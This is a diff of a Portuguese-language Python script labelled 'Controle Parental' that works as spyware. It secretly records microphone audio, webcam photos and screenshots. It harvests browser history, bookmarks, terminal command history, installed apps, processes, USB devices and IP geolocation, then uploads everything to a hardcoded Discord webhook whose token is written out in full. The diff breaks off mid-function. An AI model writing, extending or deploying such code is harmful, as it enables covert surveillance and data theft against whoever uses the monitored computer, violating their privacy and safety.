@@ -11,22 +11,23 @@ import cv2
 import psutil
 import subprocess
 from cryptography.fernet import Fernet
-import sounddevice as sd  # Para captura de áudio
-import scipy.io.wavfile as wav  # Para salvar áudio
+import sounddevice as sd
+import scipy.io.wavfile as wav
 import numpy as np
+import shutil
 
 # ==================== CONFIGURAÇÕES ====================
 LOG_DIR = "logs"
 REPORT_DIR = "relatorios"
 AUDIO_DIR = "audios"
 MAX_LOG_AGE_DAYS = 7
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1459232383445500128/UysW7g1xigRBIHf1nSv7sjyZL-U6mCW5PGSSNyG-Us5HW4KDhOw1JZLT7O_V-W97fzxS"  # <- SUBSTITUA AQUI
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1459232383445500128/UysW7g1xigRBIHf1nSv7sjyZL-U6mCW5PGSSNyG-Us5HW4KDhOw1JZLT7O_V-W97fzxS"  # <- SUBSTITUI AQUI
 ENCRYPTION_KEY = Fernet.generate_key()
-TEMPO_INICIO = time.time()  # Para calcular tempo de uso
+TEMPO_INICIO = time.time()
 
 # ==================== SETUP ====================
 def setup():
-    """Cria pastas necessárias e configura criptografia."""
+    """Cria pastas necessárias."""
     global cipher_suite
     cipher_suite = Fernet(ENCRYPTION_KEY)
     os.makedirs(LOG_DIR, exist_ok=True)
@@ -36,7 +37,7 @@ def setup():
 
 # ==================== FUNÇÕES AUXILIARES ====================
 def salvar_txt(nome_arquivo: str, dados: dict):
-    """Salva dados em um arquivo .txt formatado."""
+    """Salva dados em arquivo .txt."""
     try:
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         caminho = os.path.join(REPORT_DIR, f"{nome_arquivo}_{timestamp}.txt")
@@ -66,21 +67,19 @@ def salvar_txt(nome_arquivo: str, dados: dict):
         print(f"[-] ❌ Erro ao salvar .txt: {e}")
         return None
 
-def enviar_discord(titulo: str, descricao: str, arquivos: list = None):
-    """Envia mensagem para o Discord via webhook."""
+def enviar_discord_texto(titulo: str, descricao: str):
+    """Envia apenas texto para o Discord."""
     try:
-        # Prepara o embed
         embed = {
             "embeds": [{
                 "title": titulo,
-                "description": descricao[:4000],  # Limite do Discord
+                "description": descricao[:4000],
                 "color": 3447003,
                 "timestamp": datetime.utcnow().isoformat(),
                 "footer": {"text": "🛡️ Controle Parental"}
             }]
         }
         
-        # Envia embed primeiro
         response = requests.post(
             DISCORD_WEBHOOK_URL,
             json=embed,
@@ -89,30 +88,39 @@ def enviar_discord(titulo: str, descricao: str, arquivos: list = None):
         
         if response.status_code == 204:
             print("[+] ✅ Mensagem enviada para o Discord!")
+            return True
         else:
-            print(f"[-] ❌ Erro Discord: {response.status_code} - {response.text}")
+            print(f"[-] ❌ Erro Discord: {response.status_code}")
             return False
-        
-        # Envia arquivos separadamente (se houver)
-        if arquivos:
-            for arquivo in arquivos:
-                if os.path.exists(arquivo):
-                    with open(arquivo, "rb") as f:
-                        files = {"file": (os.path.basename(arquivo), f)}
-                        resp = requests.post(DISCORD_WEBHOOK_URL, files=files)
-                        if resp.status_code == 200:
-                            print(f"[+] 📎 Arquivo enviado: {os.path.basename(arquivo)}")
-                        else:
-                            print(f"[-] ❌ Erro ao enviar arquivo: {resp.status_code}")
-        
-        return True
     except Exception as e:
-        print(f"[-] ❌ Erro ao enviar para Discord: {e}")
+        print(f"[-] ❌ Erro: {e}")
         return False
 
-# ==================== 1. TEMPO DE USO DO PC ====================
+def enviar_discord_arquivo(arquivo_path: str, mensagem: str = ""):
+    """Envia um arquivo para o Discord."""
+    try:
+        if not os.path.exists(arquivo_path):
+            print(f"[-] ❌ Arquivo não encontrado: {arquivo_path}")
+            return False
+        
+        with open(arquivo_path, "rb") as f:
+            payload = {"content": mensagem} if mensagem else {}
+            files = {"file": (os.path.basename(arquivo_path), f)}
+            response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
+        
+        if response.status_code == 200:
+            print(f"[+] ✅ Arquivo enviado: {os.path.basename(arquivo_path)}")
+            return True
+        else:
+            print(f"[-] ❌ Erro ao enviar arquivo: {response.status_code}")
+            return False
+    except Exception as e:
+        print(f"[-] ❌ Erro: {e}")
+        return False
+
+# ==================== 1. TEMPO DE USO ====================
 def obter_tempo_uso():
-    """Calcula quanto tempo o PC está ligado desde o início do script."""
+    """Calcula tempo de uso do PC."""
     try:
         tempo_atual = time.time()
         tempo_uso_segundos = tempo_atual - TEMPO_INICIO
@@ -121,7 +129,6 @@ def obter_tempo_uso():
         minutos = int((tempo_uso_segundos % 3600) // 60)
         segundos = int(tempo_uso_segundos % 60)
         
-        # Tempo desde o boot do sistema
         boot_time = datetime.fromtimestamp(psutil.boot_time())
         tempo_desde_boot = datetime.now() - boot_time
         
@@ -134,12 +141,12 @@ def obter_tempo_uso():
         print(f"[+] ⏱️ Tempo de uso: {resultado['tempo_sessao']}")
         return resultado
     except Exception as e:
-        print(f"[-] ❌ Erro ao obter tempo de uso: {e}")
+        print(f"[-] ❌ Erro: {e}")
         return {"erro": str(e)}
 
 # ==================== 2. CAPTURA DE ÁUDIO ====================
 def capturar_audio(duracao=10, sample_rate=44100):
-    """Captura áudio do microfone por X segundos."""
+    """Grava áudio do microfone."""
     try:
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         nome_arquivo = os.path.join(AUDIO_DIR, f"audio_{timestamp}.wav")
@@ -163,284 +170,196 @@ def listar_usb():
         dispositivos = []
         
         if sistema == "Windows":
-            # Usa PowerShell para listar dispositivos USB
-            comando = 'Get-PnpDevice -Class USB | Select-Object Status, Class, FriendlyName | Format-Table -AutoSize'
+            comando = 'Get-PnpDevice -Class USB | Select-Object Status, FriendlyName | Format-Table -AutoSize'
             resultado = subprocess.run(
                 ["powershell", "-Command", comando],
                 capture_output=True, text=True, encoding='utf-8', errors='ignore'
             )
             linhas = resultado.stdout.strip().split('\n')
-            dispositivos = [linha.strip() for linha in linhas if linha.strip() and "---" not in linha]
+            dispositivos = [linha.strip() for linha in linhas if linha.strip() and "---" not in linha and "Status" not in linha]
             
         elif sistema == "Linux":
             resultado = subprocess.run(["lsusb"], capture_output=True, text=True)
             dispositivos = resultado.stdout.strip().split('\n')
         
-        print(f"[+] 🔌 Dispositivos USB encontrados: {len(dispositivos)}")
+        print(f"[+] 🔌 USB encontrados: {len(dispositivos)}")
         return dispositivos
     except Exception as e:
-        print(f"[-] ❌ Erro ao listar USB: {e}")
+        print(f"[-] ❌ Erro: {e}")
         return []
 
-# ==================== 6. LOCALIZAÇÃO GEOGRÁFICA ====================
+# ==================== 6. LOCALIZAÇÃO ====================
 def obter_localizacao():
-    """Obtém localização aproximada via IP (API gratuita, sem chave)."""
+    """Obtém localização via IP."""
     try:
         response = requests.get("http://ip-api.com/json/", timeout=10)
         dados = response.json()
         
         if dados["status"] == "success":
             localizacao = {
-                "ip": dados.get("query", "Desconhecido"),
-                "cidade": dados.get("city", "Desconhecido"),
-                "regiao": dados.get("regionName", "Desconhecido"),
-                "pais": dados.get("country", "Desconhecido"),
-                "isp": dados.get("isp", "Desconhecido"),
-                "latitude": dados.get("lat", 0),
-                "longitude": dados.get("lon", 0)
+                "ip": dados.get("query", "?"),
+                "cidade": dados.get("city", "?"),
+                "regiao": dados.get("regionName", "?"),
+                "pais": dados.get("country", "?"),
+                "isp": dados.get("isp", "?"),
+                "lat": dados.get("lat", 0),
+                "lon": dados.get("lon", 0)
             }
             print(f"[+] 📍 Localização: {localizacao['cidade']}, {localizacao['pais']}")
             return localizacao
-        return {"erro": "Não foi possível obter localização"}
+        return {"erro": "Falha"}
     except Exception as e:
-        print(f"[-] ❌ Erro ao obter localização: {e}")
+        print(f"[-] ❌ Erro: {e}")
         return {"erro": str(e)}
 
-# ==================== 9. PROCESSOS EM EXECUÇÃO ====================
+# ==================== 9. PROCESSOS ====================
 def listar_processos():
-    """Lista processos em execução com uso de CPU/RAM."""
+    """Lista processos ativos."""
     try:
         processos = []
         for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
             try:
                 info = proc.info
                 if info['cpu_percent'] > 0 or info['memory_percent'] > 0.1:
-                    processos.append({
-                        "pid": info['pid'],
-                        "nome": info['name'],
-                        "cpu": f"{info['cpu_percent']:.1f}%",
-                        "ram": f"{info['memory_percent']:.1f}%"
-                    })
-            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    processos.append(f"{info['name']} (PID:{info['pid']}) CPU:{info['cpu_percent']:.1f}% RAM:{info['memory_percent']:.1f}%")
+            except:
                 continue
         
-        # Ordena por uso de CPU (maior primeiro)
-        processos.sort(key=lambda x: float(x['cpu'].replace('%', '')), reverse=True)
-        
-        # Formata para texto
-        processos_txt = [f"{p['nome']} (PID: {p['pid']}) - CPU: {p['cpu']}, RAM: {p['ram']}" for p in processos[:30]]
-        
-        print(f"[+] 📊 Processos ativos: {len(processos)}")
-        return processos_txt
+        processos.sort(reverse=True)
+        print(f"[+] 📊 Processos: {len(processos)}")
+        return processos[:50]
     except Exception as e:
-        print(f"[-] ❌ Erro ao listar processos: {e}")
+        print(f"[-] ❌ Erro: {e}")
         return []
 
-# ==================== 10. HISTÓRICO DE COMANDOS (TERMINAL) ====================
+# ==================== 10. HISTÓRICO DO TERMINAL ====================
 def obter_historico_terminal():
-    """Obtém histórico de comandos do terminal."""
+    """Obtém comandos do terminal."""
     try:
         sistema = platform.system()
         comandos = []
         
         if sistema == "Windows":
-            # Histórico do PowerShell
             ps_history = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")
             if os.path.exists(ps_history):
                 with open(ps_history, "r", encoding="utf-8", errors="ignore") as f:
-                    comandos = f.readlines()[-50:]  # Últimos 50 comandos
-                    comandos = [cmd.strip() for cmd in comandos if cmd.strip()]
+                    comandos = [cmd.strip() for cmd in f.readlines()[-50:] if cmd.strip()]
             
         elif sistema == "Linux":
-            # Histórico do Bash
-            bash_history = os.path.expanduser("~/.bash_history")
-            if os.path.exists(bash_history):
-                with open(bash_history, "r", encoding="utf-8", errors="ignore") as f:
-                    comandos = f.readlines()[-50:]
-                    comandos = [cmd.strip() for cmd in comandos if cmd.strip()]
-            
-            # Histórico do Zsh (se existir)
-            zsh_history = os.path.expanduser("~/.zsh_history")
-            if os.path.exists(zsh_history):
-                with open(zsh_history, "r", encoding="utf-8", errors="ignore") as f:
-                    comandos.extend(f.readlines()[-50:])
+            for hist_file in ["~/.bash_history", "~/.zsh_history"]:
+                path = os.path.expanduser(hist_file)
+                if os.path.exists(path):
+                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                        comandos.extend([cmd.strip() for cmd in f.readlines()[-50:] if cmd.strip()])
         
-        print(f"[+] 💻 Comandos no histórico: {len(comandos)}")
+        print(f"[+] 💻 Comandos: {len(comandos)}")
         return comandos
     except Exception as e:
-        print(f"[-] ❌ Erro ao obter histórico do terminal: {e}")
+        print(f"[-] ❌ Erro: {e}")
         return []
 
-# ==================== 12. INFORMAÇÕES DO SISTEMA ====================
+# ==================== 12. INFO DO SISTEMA ====================
 def obter_info_sistema():
-    """Obtém informações detalhadas do sistema."""
+    """Obtém informações do sistema."""
     try:
-        # CPU
-        cpu_info = {
-            "processador": platform.processor(),
-            "nucleos_fisicos": psutil.cpu_count(logical=False),
-            "nucleos_logicos": psutil.cpu_count(logical=True),
-            "uso_atual": f"{psutil.cpu_percent()}%"
-        }
-        
-        # Memória RAM
         mem = psutil.virtual_memory()
-        ram_info = {
-            "total": f"{mem.total / (1024**3):.2f} GB",
-            "disponivel": f"{mem.available / (1024**3):.2f} GB",
-            "uso": f"{mem.percent}%"
-        }
-        
-        # Disco
         disco = psutil.disk_usage('/')
-        disco_info = {
-            "total": f"{disco.total / (1024**3):.2f} GB",
-            "usado": f"{disco.used / (1024**3):.2f} GB",
-            "livre": f"{disco.free / (1024**3):.2f} GB",
-            "uso": f"{disco.percent}%"
-        }
-        
-        # Bateria (se disponível)
-        bateria_info = {"status": "Não disponível"}
         bateria = psutil.sensors_battery()
-        if bateria:
-            bateria_info = {
-                "percentagem": f"{bateria.percent}%",
-                "carregando": "Sim" if bateria.power_plugged else "Não",
-                "tempo_restante": f"{bateria.secsleft // 60} min" if bateria.secsleft > 0 else "Calculando..."
-            }
         
-        # Sistema Operacional
-        so_info = {
-            "sistema": platform.system(),
-            "versao": platform.version(),
-            "arquitetura": platform.architecture()[0],
+        info = {
+            "so": f"{platform.system()} {platform.release()}",
             "hostname": platform.node(),
-            "usuario": os.getlogin()
+            "usuario": os.getlogin(),
+            "cpu_uso": f"{psutil.cpu_percent()}%",
+            "cpu_nucleos": psutil.cpu_count(),
+            "ram_total": f"{mem.total / (1024**3):.1f} GB",
+            "ram_uso": f"{mem.percent}%",
+            "disco_total": f"{disco.total / (1024**3):.1f} GB",
+            "disco_uso": f"{disco.percent}%",
+            "bateria": f"{bateria.percent}%" if bateria else "N/A",
+            "carregando": "Sim" if bateria and bateria.power_plugged else "Não"
         }
         
-        info_completa = {
-            "sistema_operacional": so_info,
-            "cpu": cpu_info,
-            "memoria_ram": ram_info,
-            "disco": disco_info,
-            "bateria": bateria_info
-        }
-        
-        print(f"[+] 🖥️ Informações do sistema obtidas")
-        return info_completa
+        print(f"[+] 🖥️ Info do sistema obtida")
+        return info
     except Exception as e:
-        print(f"[-] ❌ Erro ao obter info do sistema: {e}")
+        print(f"[-] ❌ Erro: {e}")
         return {"erro": str(e)}
 
-# ==================== 15. FAVORITOS DO NAVEGADOR ====================
+# ==================== 15. FAVORITOS ====================
 def obter_favoritos():
-    """Obtém favoritos/bookmarks do Chrome e Firefox."""
+    """Obtém favoritos do navegador."""
     try:
         sistema = platform.system()
         favoritos = []
         
-        # Chrome
         if sistema == "Windows":
             chrome_bookmarks = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Bookmarks")
-        elif sistema == "Linux":
-            chrome_bookmarks = os.path.expanduser("~/.config/google-chrome/Default/Bookmarks")
         else:
-            chrome_bookmarks = ""
+            chrome_bookmarks = os.path.expanduser("~/.config/google-chrome/Default/Bookmarks")
         
         if os.path.exists(chrome_bookmarks):
             with open(chrome_bookmarks, "r", encoding="utf-8") as f:
                 dados = json.load(f)
                 
-                def extrair_bookmarks(node):
-                    """Extrai bookmarks recursivamente."""
+                def extrair(node):
                     result = []
                     if isinstance(node, dict):
                         if node.get("type") == "url":
-                            result.append(f"{node.get('name', 'Sem nome')} - {node.get('url', '')}")
-                        if "children" in node:
-                            for child in node["children"]:
-                                result.extend(extrair_bookmarks(child))
+                            result.append(f"{node.get('name', '?')} - {node.get('url', '')[:60]}")
+                        for child in node.get("children", []):
+                            result.extend(extrair(child))
                     return result
                 
-                # Extrai da barra de favoritos e outros
-                roots = dados.get("roots", {})
-                for key in roots:
-                    favoritos.extend(extrair_bookmarks(roots[key]))
+                for key in dados.get("roots", {}):
+                    favoritos.extend(extrair(dados["roots"][key]))
         
-        # Firefox (simplificado - places.sqlite é mais complexo)
-        if sistema == "Windows":
-            firefox_path = os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles")
-        elif sistema == "Linux":
-            firefox_path = os.path.expanduser("~/.mozilla/firefox")
-        else:
-            firefox_path = ""
-        
-        if os.path.exists(firefox_path):
-            for profile in os.listdir(firefox_path):
-                places_db = os.path.join(firefox_path, profile, "places.sqlite")
-                if os.path.exists(places_db):
-                    try:
-                        # Copia o DB para evitar lock
-                        temp_db = os.path.join(REPORT_DIR, "temp_places.sqlite")
-                        import shutil
-                        shutil.copy2(places_db, temp_db)
-                        
-                        conn = sqlite3.connect(temp_db)
-                        cursor = conn.cursor()
-                        cursor.execute("""
-                            SELECT moz_bookmarks.title, moz_places.url 
-                            FROM moz_bookmarks 
-                            JOIN moz_places ON moz_bookmarks.fk = moz_places.id 
-                            WHERE moz_bookmarks.type = 1 
-                            LIMIT 50
-                        """)
-                        for titulo, url in cursor.fetchall():
-                            if titulo and url:
-                                favoritos.append(f"{titulo} - {url}")
-                        conn.close()
-                        os.remove(temp_db)
-                    except Exception as e:
-                        print(f"[-] Erro ao ler favoritos Firefox: {e}")
-        
-        print(f"[+] ⭐ Favoritos encontrados: {len(favoritos)}")
-        return favoritos[:100]  # Limita a 100
+        print(f"[+] ⭐ Favoritos: {len(favoritos)}")
+        return favoritos[:100]
     except Exception as e:
-        print(f"[-] ❌ Erro ao obter favoritos: {e}")
+        print(f"[-] ❌ Erro: {e}")
         return []
 
-# ==================== FUNÇÕES EXTRAS (DO CÓDIGO ORIGINAL) ====================
+# ==================== CAPTURAS ====================
 def capturar_tela():
     """Captura screenshot."""
     try:
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-        nome_arquivo = os.path.join(REPORT_DIR, f"tela_{timestamp}.png")
-        tela = ImageGrab.grab()
-        tela.save(nome_arquivo)
-        print(f"[+] 🖼️ Tela capturada: {nome_arquivo}")
-        return nome_arquivo
+        nome = os.path.join(REPORT_DIR, f"tela_{timestamp}.png")
+        ImageGrab.grab().save(nome)
+        print(f"[+] 🖼️ Tela capturada: {nome}")
+        return nome
     except Exception as e:
-        print(f"[-] ❌ Erro ao capturar tela: {e}")
+        print(f"[-] ❌ Erro: {e}")
         return None
 
 def capturar_camera():
-    """Captura foto da webcam."""
+    """Captura foto da câmera."""
     try:
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-        nome_arquivo = os.path.join(REPORT_DIR, f"camera_{timestamp}.jpg")
+        nome = os.path.join(REPORT_DIR, f"camera_{timestamp}.jpg")
         
+        print("[+] 📸 Abrindo câmera...")
         cap = cv2.VideoCapture(0)
-        time.sleep(1)
+        
+        if not cap.isOpened():
+            print("[-] ❌ Câmera não disponível")
+            return None
+        
+        time.sleep(2)  # Aguarda câmera estabilizar
+        
         ret, frame = cap.read()
         cap.release()
         
         if ret:
-            cv2.imwrite(nome_arquivo, frame)
-            print(f"[+] 📸 Foto capturada: {nome_arquivo}")
-            return nome_arquivo
-        return None
+            cv2.imwrite(nome, frame)
+            print(f"[+] ✅ Foto da câmera salva: {nome}")
+            return nome
+        else:
+            print("[-] ❌ Falha ao capturar foto")
+            return None
     except Exception as e:
-        print(f"[-] ❌ Erro ao capturar câmera: {e}")
+        print(f"[-] ❌ Erro câmera: {e}")
         return None
 
 def obter_historico_navegador():
@@ -451,27 +370,22 @@ def obter_historico_navegador():
         
         if sistema == "Windows":
             chrome_history = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History")
-        elif sistema == "Linux":
-            chrome_history = os.path.expanduser("~/.config/google-chrome/Default/History")
         else:
-            return []
+            chrome_history = os.path.expanduser("~/.config/google-chrome/Default/History")
         
         if os.path.exists(chrome_history):
-            import shutil
             temp_db = os.path.join(REPORT_DIR, "temp_history.sqlite")
             shutil.copy2(chrome_history, temp_db)
             
             conn = sqlite3.connect(temp_db)
             cursor = conn.cursor()
             cursor.execute("""
-                SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch') as visit_time
-                FROM urls
-                ORDER BY last_visit_time DESC
-                LIMIT 50
+                SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch')
+                FROM urls ORDER BY last_visit_time DESC LIMIT 100
             """)
             
             for url, titulo, data in cursor.fetchall():
-                historico.append(f"[{data}] {titulo[:50]} - {url[:80]}")
+                historico.append(f"[{data}] {titulo[:40]} - {url[:60]}")
             
             conn.close()
             os.remove(temp_db)
@@ -479,29 +393,24 @@ def obter_historico_navegador():
         print(f"[+] 🌐 Histórico: {len(historico)} entradas")
         return historico
     except Exception as e:
-        print(f"[-] ❌ Erro ao obter histórico: {e}")
+        print(f"[-] ❌ Erro: {e}")
         return []
 
 def obter_apps_instaladas():
-    """Obtém lista de apps instaladas."""
+    """Lista apps instaladas."""
     try:
         sistema = platform.system()
         apps = []
         
         if sistema == "Windows":
             import winreg
-            paths = [
-                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
-                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
-            ]
-            
-            for path in paths:
+            for path in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 
+                        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
                 try:
                     key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                     for i in range(winreg.QueryInfoKey(key)[0]):
                         try:
-                            subkey_name = winreg.EnumKey(key, i)
-                            subkey = winreg.OpenKey(key, subkey_name)
+                            subkey = winreg.OpenKey(key, winreg.EnumKey(key, i))
                             nome = winreg.QueryValueEx(subkey, "DisplayName")[0]
                             if nome:
                                 apps.append(nome)
@@ -509,7 +418,6 @@ def obter_apps_instaladas():
                             continue
                 except:
                     continue
-                    
         elif sistema == "Linux":
             resultado = subprocess.run(["dpkg", "--list"], capture_output=True, text=True)
             for linha in resultado.stdout.split('\n')[5:]:
@@ -517,15 +425,15 @@ def obter_apps_instaladas():
                 if len(partes) >= 2:
                     apps.append(partes[1])
         
-        apps = list(set(apps))[:200]  # Remove duplicatas, limita a 200
-        print(f"[+] 📦 Apps instaladas: {len(apps)}")
+        apps = list(set(apps))[:300]
+        print(f"[+] 📦 Apps: {len(apps)}")
         return apps
     except Exception as e:
-        print(f"[-] ❌ Erro ao listar apps: {e}")
+        print(f"[-] ❌ Erro: {e}")
         return []
 
 def limpar_logs_antigos():
-    """Remove logs com mais de X dias."""
+    """Remove logs antigos."""
     try:
         agora = time.time()
         limite = agora - (MAX_LOG_AGE_DAYS * 24 * 60 * 60)
@@ -537,171 +445,165 @@ def limpar_logs_antigos():
                     if os.path.getmtime(caminho) < limite:
                         os.remove(caminho)
                         print(f"[+] 🗑️ Removido: {arquivo}")
-        
         print("[+] ✅ Limpeza concluída")
     except Exception as e:
-        print(f"[-] ❌ Erro na limpeza: {e}")
+        print(f"[-] ❌ Erro: {e}")
 
-# ==================== FUNÇÃO PRINCIPAL ====================
+# ==================== MONITORAMENTO PRINCIPAL ====================
 def executar_monitoramento():
-    """Executa todas as funções de monitoramento."""
+    """Executa monitoramento completo."""
     print("\n" + "=" * 70)
-    print(f"[+] 🕐 MONITORAMENTO INICIADO - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"[+] 🕐 MONITORAMENTO - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     print("=" * 70)
     
-    arquivos_gerados = []
-    
-    # 1. Tempo de uso
+    # Coleta de dados
     tempo_uso = obter_tempo_uso()
-    
-    # 2. Captura de áudio (10 segundos)
-    audio_arquivo = capturar_audio(duracao=10)
-    if audio_arquivo:
-        arquivos_gerados.append(audio_arquivo)
-    
-    # 5. Dispositivos USB
-    usb_devices = listar_usb()
-    
-    # 6. Localização
     localizacao = obter_localizacao()
-    
-    # 9. Processos
-    processos = listar_processos()
-    
-    # 10. Histórico do terminal
-    comandos_terminal = obter_historico_terminal()
-    
-    # 12. Info do sistema
     info_sistema = obter_info_sistema()
-    
-    # 15. Favoritos
+    usb_devices = listar_usb()
+    processos = listar_processos()
+    comandos = obter_historico_terminal()
     favoritos = obter_favoritos()
-    
-    # Extras
-    historico_nav = obter_historico_navegador()
+    historico = obter_historico_navegador()
     apps = obter_apps_instaladas()
     
     # Capturas
-    tela = capturar_tela()
-    if tela:
-        arquivos_gerados.append(tela)
+    print("\n[+] 📸 Iniciando capturas...")
+    foto_camera = capturar_camera()
+    foto_tela = capturar_tela()
+    audio = capturar_audio(duracao=10)
     
-    camera = capturar_camera()
-    if camera:
-        arquivos_gerados.append(camera)
+    # Salvar relatórios .txt
+    print("\n[+] 📄 Salvando relatórios...")
+    arquivos = []
     
-    # ==================== SALVAR RELATÓRIOS .TXT ====================
+    if historico:
+        arq = salvar_txt("historico_navegador", {"sites_visitados": historico})
+        if arq: arquivos.append(arq)
     
-    # Relatório de histórico do navegador
-    if historico_nav:
-        arquivo_historico = salvar_txt("historico_navegador", {"entradas": historico_nav})
-        if arquivo_historico:
-            arquivos_gerados.append(arquivo_historico)
-    
-    # Relatório de apps instaladas
     if apps:
-        arquivo_apps = salvar_txt("apps_instaladas", {"aplicativos": apps})
-        if arquivo_apps:
-            arquivos_gerados.append(arquivo_apps)
+        arq = salvar_txt("apps_instaladas", {"aplicativos": apps})
+        if arq: arquivos.append(arq)
     
-    # Relatório de processos
     if processos:
-        arquivo_processos = salvar_txt("processos_ativos", {"processos": processos})
-        if arquivo_processos:
-            arquivos_gerados.append(arquivo_processos)
+        arq = salvar_txt("processos_ativos", {"processos": processos})
+        if arq: arquivos.append(arq)
     
-    # Relatório de comandos do terminal
-    if comandos_terminal:
-        arquivo_terminal = salvar_txt("historico_terminal", {"comandos": comandos_terminal})
-        if arquivo_terminal:
-            arquivos_gerados.append(arquivo_terminal)
+    if comandos:
+        arq = salvar_txt("historico_terminal", {"comandos": comandos})
+        if arq: arquivos.append(arq)
     
-    # Relatório de favoritos
     if favoritos:
-        arquivo_favoritos = salvar_txt("favoritos_navegador", {"bookmarks": favoritos})
-        if arquivo_favoritos:
-            arquivos_gerados.append(arquivo_favoritos)
+        arq = salvar_txt("favoritos", {"bookmarks": favoritos})
+        if arq: arquivos.append(arq)
     
-    # Relatório de USB
     if usb_devices:
-        arquivo_usb = salvar_txt("dispositivos_usb", {"dispositivos": usb_devices})
-        if arquivo_usb:
-            arquivos_gerados.append(arquivo_usb)
+        arq = salvar_txt("dispositivos_usb", {"dispositivos": usb_devices})
+        if arq: arquivos.append(arq)
     
-    # Relatório completo (resumo)
-    relatorio_completo = {
+    # Relatório resumo
+    resumo = {
         "tempo_uso": tempo_uso,
         "localizacao": localizacao,
-        "info_sistema": info_sistema,
-        "resumo": {
-            "historico_navegador": f"{len(historico_nav)} entradas",
-            "apps_instaladas": f"{len(apps)} apps",
-            "processos_ativos": f"{len(processos)} processos",
-            "comandos_terminal": f"{len(comandos_terminal)} comandos",
-            "favoritos": f"{len(favoritos)} bookmarks",
-            "dispositivos_usb": f"{len(usb_devices)} dispositivos"
+        "sistema": info_sistema,
+        "contagem": {
+            "historico": f"{len(historico)} sites",
+            "apps": f"{len(apps)} apps",
+            "processos": f"{len(processos)} processos",
+            "comandos": f"{len(comandos)} comandos",
+            "favoritos": f"{len(favoritos)} favoritos",
+            "usb": f"{len(usb_devices)} dispositivos"
         }
     }
-    arquivo_resumo = salvar_txt("relatorio_completo", relatorio_completo)
-    if arquivo_resumo:
-        arquivos_gerados.append(arquivo_resumo)
+    arq_resumo = salvar_txt("relatorio_completo", resumo)
+    if arq_resumo: arquivos.append(arq_resumo)
     
     # ==================== ENVIAR PARA DISCORD ====================
-    titulo = f"📊 Monitoramento - {datetime.now().strftime('%H:%M')}"
+    print("\n[+] 📤 Enviando para Discord...")
     
+    # 1. Envia mensagem de texto com resumo
+    titulo = f"📊 Monitoramento - {datetime.now().strftime('%d/%m/%Y %H:%M')}"
     descricao = f"""
 **⏱️ Tempo de Uso**
-• Sessão: {tempo_uso.get('tempo_sessao', 'N/A')}
-• Desde boot: {tempo_uso.get('tempo_desde_boot', 'N/A')}
+• Sessão: {tempo_uso.get('tempo_sessao', '?')}
+• Desde boot: {tempo_uso.get('tempo_desde_boot', '?')}
 
 **📍 Localização**
-• {localizacao.get('cidade', 'N/A')}, {localizacao.get('pais', 'N/A')}
-• IP: {localizacao.get('ip', 'N/A')}
-• ISP: {localizacao.get('isp', 'N/A')}
+• {localizacao.get('cidade', '?')}, {localizacao.get('pais', '?')}
+• IP: {localizacao.get('ip', '?')}
+• ISP: {localizacao.get('isp', '?')}
 
 **🖥️ Sistema**
-• SO: {info_sistema.get('sistema_operacional', {}).get('sistema', 'N/A')}
-• CPU: {info_sistema.get('cpu', {}).get('uso_atual', 'N/A')}
-• RAM: {info_sistema.get('memoria_ram', {}).get('uso', 'N/A')}
-• Disco: {info_sistema.get('disco', {}).get('uso', 'N/A')}
-• Bateria: {info_sistema.get('bateria', {}).get('percentagem', 'N/A')}
+• {info_sistema.get('so', '?')}
+• Usuário: {info_sistema.get('usuario', '?')}
+• CPU: {info_sistema.get('cpu_uso', '?')}
+• RAM: {info_sistema.get('ram_uso', '?')}
+• Disco: {info_sistema.get('disco_uso', '?')}
+• Bateria: {info_sistema.get('bateria', '?')} ({info_sistema.get('carregando', '?')})
 
 **📈 Resumo**
-• 🌐 Histórico: {len(historico_nav)} entradas
+• 🌐 Histórico: {len(historico)} sites
 • 📦 Apps: {len(apps)} instaladas
 • 📊 Processos: {len(processos)} ativos
-• 💻 Comandos: {len(comandos_terminal)} no terminal
+• 💻 Terminal: {len(comandos)} comandos
 • ⭐ Favoritos: {len(favoritos)} bookmarks
 • 🔌 USB: {len(usb_devices)} dispositivos
-• 🎤 Áudio: {'Capturado' if audio_arquivo else 'Não capturado'}
 """
+    enviar_discord_texto(titulo, descricao)
     
-    # Envia notificação + arquivos
-    sucesso = enviar_discord(titulo, descricao, arquivos_gerados)
+    time.sleep(1)  # Evita rate limit
     
-    if sucesso:
-        print("[+] ✅ Notificação enviada com sucesso!")
-    else:
-        print("[-] ❌ Falha ao enviar notificação")
+    # 2. Envia foto da câmera (para ver quem está no PC)
+    if foto_camera:
+        enviar_discord_arquivo(foto_camera, "📸 **FOTO DA CÂMERA** - Quem está usando o PC:")
     
-    # Limpeza de logs antigos
+    time.sleep(1)
+    
+    # 3. Envia screenshot
+    if foto_tela:
+        enviar_discord_arquivo(foto_tela, "🖼️ **SCREENSHOT** - O que está na tela:")
+    
+    time.sleep(1)
+    
+    # 4. Envia áudio
+    if audio:
+        enviar_discord_arquivo(audio, "🎤 **ÁUDIO** - Gravação ambiente (10s):")
+    
+    time.sleep(1)
+    
+    # 5. Envia arquivos .txt
